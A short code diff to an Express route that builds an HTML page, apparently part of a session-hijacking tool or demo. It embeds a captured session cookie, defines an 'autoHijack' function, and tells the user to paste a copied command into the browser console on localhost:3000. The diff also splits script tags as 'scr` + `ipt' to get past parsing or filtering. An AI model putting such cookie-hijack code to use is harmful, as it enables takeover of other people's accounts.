@@ -470,7 +470,7 @@ app.get('/', (req, res) => {
             </div>
           </div>
           
-          <script>
+          <scr` + `ipt>
             const sessionCookie = \`\${sessionCookie}\`;
             
             function autoHijack() {
@@ -494,7 +494,7 @@ app.get('/', (req, res) => {
                 alert('✅ Command copied!\\n\\nNow:\\n1. Open http://localhost:3000 (incognito)\\n2. F12 → Console\\n3. Paste & Enter');
               });
             }
-          </script>
+          </scr` + `ipt>
         </body>
         </html>
       \`);
